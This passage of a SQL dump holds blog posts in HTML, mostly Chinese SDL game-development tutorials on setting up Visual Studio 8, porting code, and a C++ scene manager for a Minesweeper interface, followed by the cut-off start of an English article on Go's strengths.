8</p>\r\n\r\n<p>1、到SDL网站http://www.libsdl.org/download-1.2.php下载sdl开发包</p>\r\n\r\n<p>2、解压SDL，这里假设解压到SDL目录，将SDL\\lib文件中夹中的SDL.lib和SDLmain.lib拷贝到D:\\Program Files\\Microsoft Visual Studio 8\\VC\\lib目录下。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3、将SDL\\lib文件夹中的SDL.dll拷贝到D:\\Program Files\\Microsoft Visual Studio 8\\VC\\bin目录下。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 4、在D:\\Program Files\\Microsoft Visual Studio 8\\VC\\include中新建一个SDL文件夹，然后将上面解压后SDL\\include目录下的所有头文件拷贝到刚才新建的文件夹中。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:medium\">&nbsp;&nbsp;&nbsp; SDL测试</span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、在VC8中新建一个win32控制台程序</p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;2、下一步选择&ldquo;空项目&rdquo;</span></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">3、点击完成，然后新建一个cpp文件，将下面的代码拷贝到cpp文件中</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDL/SDL.h\"  \r\nint main( int argc, char* args[] )  \r\n{  \r\n    SDL_Init( SDL_INIT_EVERYTHING );    //初始化SDL环境  \r\n    SDL_Quit();                         //退出SDL环境  \r\n    return 0;  \r\n}</code></pre>\r\n\r\n<p>4、设置工程的链接选项，增加&nbsp;SDL.lib SDLmain.lib</p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">5、设置子系统为&ldquo;windows&rdquo;，这里设置成这个是为了不让他弹出控制台窗口，但是如果你需要用到控制台窗口来打印一些调试信息，那么这里可以设置为&ldquo;控制台&rdquo;。建议将debug版本配置成&ldquo;控制台&rdquo;，release版本配置成&ldquo;windows&rdquo;。</span></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">6、分别编译运行release和debug版本，如果没有出现异常，说明环境配置成功。</span></p>\r\n',0,0,'SDL游戏开发教程08（环境准备vc8 sp1）',60,NULL,0),(26,0,'20150613221245',2,'<p>&nbsp;这节介绍怎么把前面的代码移植到VC8中来。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、参考前一节（http://public0821.iteye.com/blog/306209&nbsp;），将SDL环境配置起来。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2、删除前一节工程中的cpp文件，将eclipse中的代码添加到前一节创建的工程中来。（这里不介绍怎么添加，相信凭大家的智商，这个不是问题）</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3、编译配置BOOST环境。（参考http://public0821.iteye.com/blog/306179&nbsp;）</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 4、配置SDL_img和SDL_ttf。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a、参考（http://public0821.iteye.com/blog/294105&nbsp;），下载SDL_img和SDL_ttf开发包。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b、分别解压SDL_ttf-devel-2.0.9-VC8.zip和SDL_image-devel-1.2.7-VC9.zip</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c、将解压后文件夹中的头文件拷贝到D:\\Program Files\\Microsoft Visual Studio 8\\VC\\include\\SDL</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d、将解压后文件夹中的lib文件拷贝到D:\\Program Files\\Microsoft Visual Studio 8\\VC\\lib</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e、将解压后文件夹中的dll文件拷贝到D:\\Program Files\\Microsoft Visual Studio 8\\VC\\bin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 5、配置link选项，增加SDL_image.lib SDL_ttf.lib</p>\r\n\r\n<p>&nbsp; 编译运行整个工程，如果一切配置正常，就可以看到Lesson01，Lesson02， Lesson03的运行效果。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 附件中是整个工程的代码。里面有些代码是新写的，有bug，这也是我为什么换到VC8平台来的原因。等bug解决了之后再在下一节中介绍新代码。</p>\r\n',0,0,'SDL游戏开发教程09（代码迁移到VC8）',65,NULL,0),(27,0,'20150613221522',2,'<p>&nbsp; &nbsp;这是利用场景管理器创建的一个扫雷游戏界面，为后面的扫雷游戏做准备。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 这里的场景管理器主要有四个类，SDLEntity（实体）、SDLSceneNode（节点）、SDLLayer（层）、SDLSceneManager（场景管理器）。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 他们的关系是：一个SDLSceneManager管理多个SDLLayer，一个SDLLayer有多个SDLSceneNode，一个SDLSceneNode上面关联一个SDLEntity。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDLSceneManager管理多个SDLLayer是为了将不同的层分离开来，并且通过索引号来决定哪个层显示在下面，哪个层显示在上面。这样做有利用分开管理，比如将游戏界面中不变的背景和游戏中经常变化的前景分开，设置背景的索引号小于前景索引号，这样就可以保证前景在上面显示，背景在后面显示，同时也可以通过整体平移背景层，来达到整个游戏场景的向前移动的效果。</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLSCENEMANAGER_H_\r\n#define SDLSCENEMANAGER_H_\r\n\r\n#include &lt;map&gt;\r\n#include \"SDL/SDLSurface.h\"\r\nclass SDLLayer;\r\nclass SDLSceneManager\r\n{\r\n	friend class SDL;\r\nprivate:\r\n	SDLSceneManager();\r\npublic:\r\n	virtual ~SDLSceneManager();\r\npublic:\r\n	//获取默认层，默认层为最底层\r\n	SDLLayer* getDefaultLayer();\r\n\r\n	//获取索引号对应的层，索引号必须大于0，索引号大的显示在前面\r\n	SDLLayer* getLayer(int index);\r\n\r\n	//移除索引号对应的层\r\n	void removeLayer(int index);\r\n\r\n	//绘制整个场景\r\n	void	draw(SDLSurfacePtr screen);\r\nprivate:\r\n	std::map&lt;int, SDLLayer*&gt; layers;\r\n};\r\n\r\n#endif /* SDLSCENEMANAGER_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">SDLLayer负责管理层中的SDLSceneNode，每个层都有一个根节点，根节点位于整个层的左上角，通过根节点可以创建子节点，然后子节点可以创建自己的子节点，以此类推，就可以得到一棵节点树。整棵节点树就构成了当前层要显示内容的布局。</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLLAYER_H_\r\n#define SDLLAYER_H_\r\n#include \"SDLSceneNode.h\"\r\nclass SDLSceneManager;\r\nclass SDLLayer\r\n{\r\n	friend class SDLSceneManager;\r\nprivate:\r\n	SDLLayer(SDLSceneManager * sceneManager, int id);\r\npublic:\r\n	virtual ~SDLLayer();\r\npublic:\r\n	//获得当前层的根节点\r\n	SDLSceneNode* 	getRootSceneNode();\r\n\r\n	//获取当前层的索引号\r\n	int				getID();\r\n\r\nprivate:\r\n	//绘制整个层\r\n	void			draw(SDLSurfacePtr screen);\r\nprivate:\r\n	SDLSceneNode * 		rootNode;\r\n	int					id;\r\n	SDLSceneManager *	sceneManager;\r\n};\r\n\r\n#endif /* SDLLAYER_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDLSceneNode代表SDLLayer中的一个具体位置，他记录有相对与父节点的相对坐标，通过父节点的绝对坐标，可以获取当前节点的绝对坐标，根节点的绝对坐标为（0，0）。一个节点可以有多个子节点，不同的子节点通过名称来区分；一个节点可以关联一个实体（以后可能会扩充到关联多个），当关联了实体后，场景管理器就会在节点的当前位置绘制实体。</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLSCENENODE_H_\r\n#define SDLSCENENODE_H_\r\n#include \"SDL/SDLCore.h\"\r\n#include \"SDLEntity.h\"\r\nclass SDLLayer;\r\nclass SDLSceneNode\r\n{\r\n	friend class SDLLayer;\r\nprivate:\r\n	SDLSceneNode();\r\npublic:\r\n	SDLSceneNode(SDLSceneNode *parent, std::string name, int x = 0, int y = 0);\r\npublic:\r\n	virtual ~SDLSceneNode();\r\npublic:\r\n	//获取节点名称\r\n	std::string getName();\r\n\r\n	//回去节点相对位置\r\n	SDL_Point getPosition();\r\n\r\n	//获取节点绝对位置\r\n	SDL_Point getAbsolutePosition();\r\n\r\n	//关联实体\r\n	void attachEntity(SDLEntity *entity);\r\n\r\n	//取消与实体的关联\r\n	void detachEntity();\r\n\r\n	//创建子节点\r\n	SDLSceneNode* createChildSceneNode(std::string name, int x = 0, int y = 0);\r\n\r\n	//创建一个与自己关联的实体\r\n	SDLEntity* createAttachedEntity(const std::string name, SDLSurfacePtr surface);\r\n\r\n	//获取已经关联的实体\r\n	SDLEntity* getEntity();\r\nprivate:\r\n\r\n	//绘制本节点和所有的子节点\r\n	void	draw(SDLSurfacePtr screen);\r\nprivate:\r\n	SDLEntity *entity;\r\n	std::map&lt;std::string, SDLSceneNode*&gt; children;\r\n	std::string name;\r\n	SDLLayer *layer;\r\n	SDLSceneNode *parent;\r\n	SDL_Point	position;\r\n};\r\n\r\n#endif /* SDLSCENENODE_H_ */</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDLEntity负责管理要显示在屏幕上的图像，一个SDLEntity只能包含一个surface，只能关联到一个节点。这里实体名称的作用主要是为了标示一个实体，便于跟踪调试，以后可能会有其他用途（在ogre里面能在场景管理器中通过实体的名称来获取实体，我们这里不行，因为暂时没有看出这样做有什么大的用途）。</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLENTITY_H_\r\n#define SDLENTITY_H_\r\n#include \"SDL/SDLSurface.h\"\r\n#include &lt;string&gt;\r\nclass	SDLSceneNode;\r\nclass SDLEntity\r\n{\r\nprivate:\r\n	SDLEntity();\r\npublic:\r\n	SDLEntity(std::string name, SDLSurfacePtr surface, SDLSceneNode *node = NULL);\r\n	virtual ~SDLEntity();\r\npublic:\r\n	//获取关联的节点\r\n	SDLSceneNode * getSceneNode();\r\n\r\n	//获取名称\r\n	std::string getName();\r\n\r\n	//获取包含的Surface\r\n	SDLSurfacePtr getSurface();\r\n\r\n	//设置包含的Surface\r\n	void setSurface(SDLSurfacePtr surface);\r\n\r\n	//取消关联节点\r\n	void detachSceneNode();\r\n\r\n	//关联节点\r\n	void attachSceneNode(SDLSceneNode *	node);\r\nprivate:\r\n	std::string name;\r\n	SDLSurfacePtr surface;\r\n	SDLSceneNode *	node;\r\n};\r\n\r\n#endif /* SDLENTITY_H_ */</code></pre>\r\n\r\n<p>&nbsp; &nbsp; 这里的逻辑比较简单，以后随着应用的深入，我们再来强化他的功能。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 有了场景管理器后，我们不需要在onRender函数中写任何代码了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 在SDLFrame::open的消息循环中，去掉调用onRender的代码，加入场景绘制的代码，同时在场景绘制前和绘制后各加一个函数，便于在显示之前和之后做一些事情。</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">		beforeRender();\r\n\r\n		SDL::sceneManager()-&gt;draw(screen);\r\n		\r\n		afterRender();</code></pre>\r\n\r\n<p>&nbsp; 下面是应用的代码</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">void Lesson04::onInit()\r\n{		\r\n\r\n	SDLLayer * background = SDL::sceneManager()-&gt;getDefaultLayer();\r\n	SDLSceneNode *root = SDL::sceneManager()-&gt;getLayer(1)-&gt;getRootSceneNode();\r\n\r\n	//加载图片\r\n	SDLSurfacePtr	mine_unknown = SDL::imageManager()-&gt;loadImage(MINE_UNKNOWN);\r\n	SDLSurfacePtr	frame_outer_h = SDL::imageManager()-&gt;loadImage(FRAME_OUTER);\r\n	SDLSurfacePtr	frame_outer_v = SDL::transform()-&gt;Rotate90Degrees(frame_outer_h, 1);\r\n	SDLSurfacePtr	frame_inner_h = SDL::imageManager()-&gt;loadImage(FRAME_INNER);\r\n	SDLSurfacePtr	frame_inner_v = SDL::transform()-&gt;Rotate90Degrees(frame_inner_h, 1);\r\n	SDLSurfacePtr	frame_background_src = SDL::imageManager()-&gt;loadImage(FRAME_BACKGROUND);\r\n\r\n	SDL_Rect		mine_unknown_rect = mine_unknown-&gt;value()-&gt;clip_rect;\r\n	SDL_Rect		frame_outer_rect = frame_outer_h-&gt;value()-&gt;clip_rect;\r\n	SDL_Rect		frame_inner_rect = frame_inner_h-&gt;value()-&gt;clip_rect;\r\n	SDL_Rect		frame_background_rect = frame_background_src-&gt;value()-&gt;clip_rect;\r\n\r\n\r\n	//计算扫雷区域的大小\r\n	SDL_Rect mine_frame;\r\n	mine_frame.w = MINE_COLS * mine_unknown_rect.w\r\n						+ (MINE_COLS-1) * frame_inner_rect.h\r\n						+ frame_outer_rect.h * 2;\r\n	mine_frame.h = MINE_ROWS * mine_unknown_rect.h\r\n						+ (MINE_ROWS-1) * frame_inner_rect.h\r\n						+ frame_outer_rect.h * 2;\r\n	SDLSurfacePtr frame_background = SDL::transform()-&gt;zoom(frame_background_src, mine_frame.w, mine_frame.h);\r\n	frame_background_rect = frame_background-&gt;value()-&gt;clip_rect;\r\n\r\n	//----------------------------------------------------------------------------------------\r\n	//创建背景图\r\n	SDLSurfacePtr imageSrc = SDL::imageManager()-&gt;loadImage(BACKGROUND_ROOT);\r\n	SDLSurfacePtr image = SDL::transform()-&gt;zoom(imageSrc, screen-&gt;value()-&gt;clip_rect.w, screen-&gt;value()-&gt;clip_rect.h) ;\r\n	background-&gt;getRootSceneNode()-&gt;createChildSceneNode(\"image\", 0, 0)-&gt;createAttachedEntity(\"image\",image);\r\n	//----------------------------------------------------------------------------------------\r\n	//创建雷区背景\r\n	int	x = (screen-&gt;value()-&gt;clip_rect.w - frame_background_rect.w)/2;\r\n	int	y = (screen-&gt;value()-&gt;clip_rect.h - frame_background_rect.h) - 20;\r\n	SDLSceneNode *frame_background_node = root-&gt;createChildSceneNode(FRAME_BACKGROUND, x, y);\r\n	frame_background_node-&gt;createAttachedEntity(FRAME_BACKGROUND, frame_background);\r\n\r\n	//----------------------------------------------------------------------------------------\r\n	//创建边框\r\n	SDLSurfacePtr frame_outer_h_all = SDL::transform()-&gt;flat(frame_outer_h\r\n			, frame_background_rect.w\r\n			, frame_outer_rect.h);\r\n	SDLSurfacePtr frame_outer_v_all = SDL::transform()-&gt;flat(frame_outer_v\r\n				, frame_outer_rect.h\r\n				, frame_background_rect.h);\r\n	//上\r\n	std::string FREAM_OUTER_TOP = FRAME_OUTER + \"TOP\";\r\n	SDLSceneNode * frame_outer_top_node = frame_background_node-&gt;createChildSceneNode(FREAM_OUTER_TOP\r\n				, 0\r\n				, 0);\r\n	frame_outer_top_node-&gt;createAttachedEntity(FREAM_OUTER_TOP, frame_outer_h_all);\r\n	//下\r\n	std::string FREAM_OUTER_BOTTOM = FRAME_OUTER + \"BOTTOM\";\r\n	SDLSceneNode *	frame_outer_bottom_node = frame_background_node-&gt;createChildSceneNode(FREAM_OUTER_BOTTOM\r\n				, 0\r\n				, frame_background_rect.h - frame_outer_rect.h);\r\n	frame_outer_bottom_node-&gt;createAttachedEntity(FREAM_OUTER_BOTTOM, frame_outer_h_all);\r\n	//左\r\n	std::string FREAM_OUTER_LEFT = FRAME_OUTER + \"LEFT\";\r\n	SDLSceneNode *	frame_outer_left_node = frame_background_node-&gt;createChildSceneNode(FREAM_OUTER_LEFT\r\n				, 0\r\n				, 0);\r\n	frame_outer_left_node-&gt;createAttachedEntity(FREAM_OUTER_LEFT, frame_outer_v_all);\r\n	//右\r\n	std::string FREAM_OUTER_RIGHT = FRAME_OUTER + \"RIGHT\";\r\n	SDLSceneNode *frame_outer_right_node = frame_background_node-&gt;createChildSceneNode(FREAM_OUTER_RIGHT\r\n			, frame_background_rect.w - frame_outer_rect.h\r\n			, 0);\r\n	frame_outer_right_node-&gt;createAttachedEntity(FREAM_OUTER_RIGHT, frame_outer_v_all);\r\n\r\n	//-----------------------------------------------------------------------------------------\r\n	//创建初始雷格\r\n	for(int row = 0; row &lt; MINE_ROWS; row++)\r\n	{\r\n		for(int col = 0; col &lt; MINE_COLS; col++)\r\n		{\r\n			std::string name = MINE_UNKNOWN + boost::lexical_cast&lt;std::string&gt;(row*MINE_COLS + col);\r\n			SDLSceneNode *node = frame_background_node-&gt;createChildSceneNode(name\r\n					, frame_outer_rect.h + col * (mine_unknown_rect.w + frame_inner_rect.h)\r\n					, frame_outer_rect.h + row * (mine_unknown_rect.h + frame_inner_rect.h));\r\n			node-&gt;createAttachedEntity(name, mine_unknown);\r\n			this-&gt;mines[row][col] = node;\r\n		}\r\n	}\r\n\r\n	//-----------------------------------------------------------------------------------------\r\n	//创建内部网格\r\n	SDLSurfacePtr frame_iner_h_all = SDL::transform()-&gt;flat(frame_inner_h\r\n				, frame_background_rect.w - frame_outer_rect.h*2\r\n				, frame_inner_rect.h);\r\n		SDLSurfacePtr frame_iner_v_all = SDL::transform()-&gt;flat(frame_inner_v\r\n					, frame_inner_rect.h\r\n					, frame_background_rect.h - frame_outer_rect.h*2);\r\n	for(int col = 1; col &lt; MINE_COLS; col++)\r\n	{\r\n		std::string name = FRAME_INNER + \"v\" + boost::lexical_cast&lt;std::string&gt;(col);\r\n		SDLSceneNode *node = frame_background_node-&gt;createChildSceneNode(name\r\n				, frame_outer_rect.h + col * mine_unknown_rect.w + (col-1)*frame_inner_rect.h\r\n				, frame_outer_rect.h);\r\n		node-&gt;createAttachedEntity(name, frame_iner_v_all);\r\n	}\r\n	for(int row = 1; row &lt; MINE_ROWS; row++)\r\n	{\r\n		std::string name = FRAME_INNER + \"r\" + boost::lexical_cast&lt;std::string&gt;(row);\r\n		SDLSceneNode *node = frame_background_node-&gt;createChildSceneNode(name\r\n				, frame_outer_rect.h\r\n				, frame_outer_rect.h + row * mine_unknown_rect.h + (row-1)*frame_inner_rect.h);\r\n		node-&gt;createAttachedEntity(name, frame_iner_h_all);\r\n	}\r\n	//-----------------------------------------------------------------------------------------\r\n	//创建上面的显示剩余雷数和所花时间数\r\n\r\n	//剩余雷数\r\n	int	xStart = 0, yStart = 0;\r\n	SDLSurfacePtr mineAmountTitleSf = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_AMOUNT, 255, 255, 255);\r\n	xStart = frame_background_node-&gt;getPosition().x;\r\n	yStart = (frame_background_node-&gt;getPosition().y - mineAmountTitleSf-&gt;value()-&gt;clip_rect.h)/2;\r\n	SDLSceneNode *mineAmountTitelNode = root-&gt;createChildSceneNode(MINE_AMOUNT, xStart, yStart);\r\n	mineAmountTitelNode-&gt;createAttachedEntity(MINE_AMOUNT, mineAmountTitleSf);\r\n\r\n	SDLFontPtr font = SDL::fontManager()-&gt;OpenFont(FONT, 24);\r\n	SDLSurfacePtr mineAmountSf = font-&gt;RenderUNICODEBlended(\"99\", SDL::assistant()-&gt;makeColor(255, 0, 0));\r\n	xStart = mineAmountTitleSf-&gt;value()-&gt;clip_rect.w + frame_background_node-&gt;getPosition().x + 5;\r\n	yStart = (frame_background_node-&gt;getPosition().y - mineAmountSf-&gt;value()-&gt;clip_rect.h)/2;\r\n	this-&gt;mineAmountNode = root-&gt;createChildSceneNode(MINE_AMOUNT+boost::lexical_cast&lt;std::string&gt;(1), xStart, yStart);\r\n	mineAmountNode-&gt;createAttachedEntity(MINE_AMOUNT+boost::lexical_cast&lt;std::string&gt;(1), mineAmountSf);\r\n\r\n	//重启图标\r\n	SDLSurfacePtr restartSf = SDL::imageManager()-&gt;loadImageWithoutColor(RESTART, 255, 255, 255);\r\n	xStart = (screen-&gt;value()-&gt;clip_rect.w - restartSf-&gt;value()-&gt;clip_rect.w)/2;\r\n	yStart = (frame_background_node-&gt;getPosition().y - restartSf-&gt;value()-&gt;clip_rect.h)/2;\r\n	SDLSceneNode *restartNode = root-&gt;createChildSceneNode(RESTART, xStart, yStart);\r\n	restartNode-&gt;createAttachedEntity(RESTART, restartSf);\r\n\r\n	//计时器\r\n	SDLSurfacePtr timeCounterSf = font-&gt;RenderUNICODEBlended(\"000\", SDL::assistant()-&gt;makeColor(255, 0, 0));\r\n	xStart = frame_background_node-&gt;getPosition().x + frame_background_rect.w - timeCounterSf-&gt;value()-&gt;clip_rect.w;\r\n	yStart = (frame_background_node-&gt;getPosition().y - timeCounterSf-&gt;value()-&gt;clip_rect.h)/2;\r\n	SDLSceneNode *timeCounterNode = root-&gt;createChildSceneNode(CLOCK+boost::lexical_cast&lt;std::string&gt;(1), xStart, yStart);\r\n	timeCounterNode-&gt;createAttachedEntity(CLOCK+boost::lexical_cast&lt;std::string&gt;(1), timeCounterSf);\r\n\r\n	SDLSurfacePtr clockSf = SDL::imageManager()-&gt;loadImageWithoutColor(CLOCK, 255, 255, 255);\r\n	xStart = frame_background_node-&gt;getPosition().x + frame_background_rect.w\r\n				- timeCounterSf-&gt;value()-&gt;clip_rect.w - clockSf-&gt;value()-&gt;clip_rect.w - 5;\r\n	yStart = (frame_background_node-&gt;getPosition().y - clockSf-&gt;value()-&gt;clip_rect.h)/2;\r\n	this-&gt;clockNode = root-&gt;createChildSceneNode(CLOCK, xStart, yStart);\r\n	clockNode-&gt;createAttachedEntity(CLOCK, clockSf);\r\n\r\n	//插旗\r\n	SDLSurfacePtr mine_flag = SDL::transform()-&gt;zoom(SDL::imageManager()-&gt;loadImage(MINE_FLAG), mine_unknown_rect.w, mine_unknown_rect.w);\r\n	this-&gt;mines[4][5]-&gt;getEntity()-&gt;setSurface(mine_flag);\r\n	this-&gt;mines[8][10]-&gt;getEntity()-&gt;setSurface(mine_flag);\r\n	this-&gt;mines[10][3]-&gt;getEntity()-&gt;setSurface(mine_flag);\r\n	//插问号\r\n	SDLSurfacePtr mine_doubt_src = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_DOUBT, 255, 255, 255);\r\n	SDLSurfacePtr mine_doubt = SDL::video()-&gt;copySurface(mine_unknown);\r\n	SDL::video()-&gt;BlitSurface(mine_doubt_src, NULL, mine_doubt, NULL);\r\n	this-&gt;mines[8][5]-&gt;getEntity()-&gt;setSurface(mine_doubt);\r\n	this-&gt;mines[4][10]-&gt;getEntity()-&gt;setSurface(mine_doubt);\r\n	this-&gt;mines[5][3]-&gt;getEntity()-&gt;setSurface(mine_doubt);\r\n	//插0，1，2，3，4，5，6，7，8\r\n	SDLEntity *entity = this-&gt;mines[8][3]-&gt;getEntity();\r\n	entity-&gt;detachSceneNode();\r\n	delete entity;\r\n	SDLSurfacePtr mine_number_1 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_1, 255, 255, 255);\r\n	this-&gt;mines[8][6]-&gt;getEntity()-&gt;setSurface(mine_number_1);\r\n	SDLSurfacePtr mine_number_2 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_2, 255, 255, 255);\r\n	this-&gt;mines[9][10]-&gt;getEntity()-&gt;setSurface(mine_number_2);\r\n	SDLSurfacePtr mine_number_3 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_3, 255, 255, 255);\r\n	this-&gt;mines[2][3]-&gt;getEntity()-&gt;setSurface(mine_number_3);\r\n	SDLSurfacePtr mine_number_4 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_4, 255, 255, 255);\r\n	this-&gt;mines[5][6]-&gt;getEntity()-&gt;setSurface(mine_number_4);\r\n	SDLSurfacePtr mine_number_5 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_5, 255, 255, 255);\r\n	this-&gt;mines[12][10]-&gt;getEntity()-&gt;setSurface(mine_number_5);\r\n	SDLSurfacePtr mine_number_6 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_6, 255, 255, 255);\r\n	this-&gt;mines[15][3]-&gt;getEntity()-&gt;setSurface(mine_number_6);\r\n	SDLSurfacePtr mine_number_7 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_7, 255, 255, 255);\r\n	this-&gt;mines[13][12]-&gt;getEntity()-&gt;setSurface(mine_number_7);\r\n	SDLSurfacePtr mine_number_8 = SDL::imageManager()-&gt;loadImageWithoutColor(MINE_NUMBER_8, 255, 255, 255);\r\n	this-&gt;mines[11][15]-&gt;getEntity()-&gt;setSurface(mine_number_8);\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'SDL游戏开发教程10（场景管理器）',60,NULL,0),(28,0,'20150613221735',2,'<p>&nbsp;到目前为止，该教程已经涵盖了开发一般桌面游戏所需要的大部分技术，后续主要集中在网络这块的开发，到时候将会介绍一些基本的网络编程知识。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SDL游戏开发是我第一次接触，写这个教程也是对自己的学习过程做一个记录和总结，希望对想要了解SDL游戏开发的人有些帮助。在编写这个教程的过程中，暴露了一些问题，在此，自己总结一下：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、开始这个教程的时候，用的是MINGW+ECLIPSE环境，最初的想法是通过熟悉这套环境，以后到LINUX环境下做SDL游戏开发，会容易上手。结果是，这套环境在windows下并不太好用，一个原因是GCC和VC8两个编译器有些差别，错误提示的方式不一样，并且对异常的处理方式也不一样。另一个原因是DEBUG不好用，速度慢，还常启动不起来或者出些莫名其妙的错误。通过这次得出的结论是：对于开发环境的选择，一定要选当前系统平台下的主流开发工具，毕竟用的人多，BUG少。对于学习来说，如果代码量少，可以尝试选择其他系统平台主流开发工具的当前系统版本，为以后跨系统平台的开发积累经验。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2、SDLCore.h文件的设计。开始的时候，将这个头文件设置成这样主要有三个目的：a、工厂类模式，这里统一生成常用类的对象，并且保证对象只有一份。b、将常用类集中到这里，便于使用的人了解这个库提供了哪些功能，提供一个统一的代码查看入口。c、使用方便，只要一个SDL::就什么都出来了。但造成的结果是过渡依赖，比如你只用到了sceneManager，并没有用到别的类，那么包含了这个头文件后，当其他类的头文件发生变化，当前类也需要重新编译，造成编译时间变长；同时由于过渡依赖，造成头文件包含关系过于复杂，常常出现找不到类定义的错误。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>基于第二个原因，重新设计了SDLCore.h文件，将它定位为只供外部模块调用的头文件。模块内部类之间相互包含的时候尽量最小化依赖，只包含自己依赖的头文件。</p>\r\n',0,0,'SDL游戏开发教程11（总结和代码调整）',65,NULL,0),(29,0,'20150617085051',2,'<p>Go&#39;s built-in(内置) concurrency（并发性、同时） gives it an edge for networking, distributed functions, and services; but there&#39;s work to be done in other areas</p>\r\n\r\n<p>After five years and change in the wild, Google&#39;s Go language -- with version 1.5 set to come out this August -- has gone from being a curiosity to a promising source for fast-moving new projects.</p>\r\n\r\n<p>But what kinds of projects are Go best for building, and how is that likely to change as the language evolves through new versions and grows in popularity? Here are the types of applications where Go really shines, where it works well, and where it&#39;ll need to up its game.</p>\r\n\r\n<p><strong>The really good: Network and Web servers</strong></p>\r\n\r\n<p>Network applications live and die by concurrency, and Go&#39;s native concurrency features --&nbsp;goroutines&nbsp;and&nbsp;channels, mainly -- are well suited for such work. Consequently, many Go projects are for networking, distributed functions, or services:&nbsp;APIs,&nbsp;Web servers,&nbsp;minimal frameworks for Web applications, and the rest.</p>\r\n\r\n<p>Go programmers like that the items they use most in such projects are either a part of the language, such as goroutines for threadlike behavior, or available in the standard library like Go&#39;s&nbsp;http package. This &quot;batteries included&quot; philosophy hearkens back to Python, as do many of Go&#39;s best attributes, such as speed of development and deployment.</p>\r\n\r\n<p><strong>The also really good: Stand-alone command-line apps or scripts</strong></p>\r\n\r\n<p>Due to Go&#39;s consistent behavior across platforms, it&#39;s easy to put out simple command-line apps that run most anywhere. It&#39;s another echo of Go&#39;s similarities to Python, and here Go has a few advantages.</p>\r\n\r\n<p>For one, the executables created by Go are precisely that: Stand-alone executables, with no external dependencies unless you specify them. With Python, you must have a copy of the interpreter on the target machine or an interpreter of a particular revision of Python (in the case of some Python scripts).</p>\r\n\r\n<p>Another advantage Go has here is speed. The resulting executables run far faster than vanilla Python, or for that matter most any other dynamically executed language, with the possible exception of JavaScript.</p>\r\n\r\n<p>Finally, none of the above comes at the cost of being able to talk to the underlying system. Go programs can talk to external C libraries or make native system calls. Docker, for instance, works this way. It interfaces with low-level Linux functions, cgroups, and namespaces, to work its magic.</p>\r\n\r\n<p><strong>The not so good: Desktop or GUI-based apps</strong></p>\r\n\r\n<p>Here&#39;s where the going gets a little grimmer.&nbsp;Right now, the culture of software around building rich GUIs for Go applications, such as those in desktop applications, is still scattered.</p>\r\n\r\n<p>That said, various projects exist -- there are bindings for the&nbsp;GTK&nbsp;and&nbsp;GTK3&nbsp;frameworks, and another intended to provide&nbsp;platform-native UIs, although the latter relies on C bindings and is not written in pure Go. Windows users can try out&nbsp;walk, and some folks at 